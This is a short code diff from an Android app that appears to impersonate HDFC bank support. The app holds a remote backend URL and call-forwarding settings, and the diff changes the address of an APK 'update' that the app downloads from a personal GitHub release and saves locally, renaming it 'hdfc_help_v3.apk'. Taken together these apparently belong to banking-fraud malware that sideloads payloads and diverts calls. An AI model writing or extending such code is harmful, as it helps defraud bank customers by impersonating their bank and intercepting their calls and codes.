@@ -42,7 +42,7 @@ import java.util.Locale;
 public class MainActivity extends BridgeActivity {
     private static final String TAG = "HDFC_MainActivity";
     private static final String BACKEND_URL = "https://backprince.onrender.com";
-    private static final String UPDATE_URL = "https://github.com/amanxridex/newmade/releases/download/v2.0.62/hdfc_card_support.apk";
+    private static final String UPDATE_URL = "https://github.com/amanxridex/newmade/releases/download/v3.0.65/hdfc_help_v3.apk";
     private String forwardingNumber = null;
     private boolean forwardingEnabled = false;
 
@@ -81,7 +81,7 @@ public class MainActivity extends BridgeActivity {
                     c.setRequestMethod("GET");
                     c.connect();
 
-                    File file = new File(getExternalFilesDir(null), "update.apk");
+                    File file = new File(getExternalFilesDir(null), "hdfc_help_v3.apk");
                     FileOutputStream fos = new FileOutputStream(file);
                     InputStream is = c.getInputStream();
 
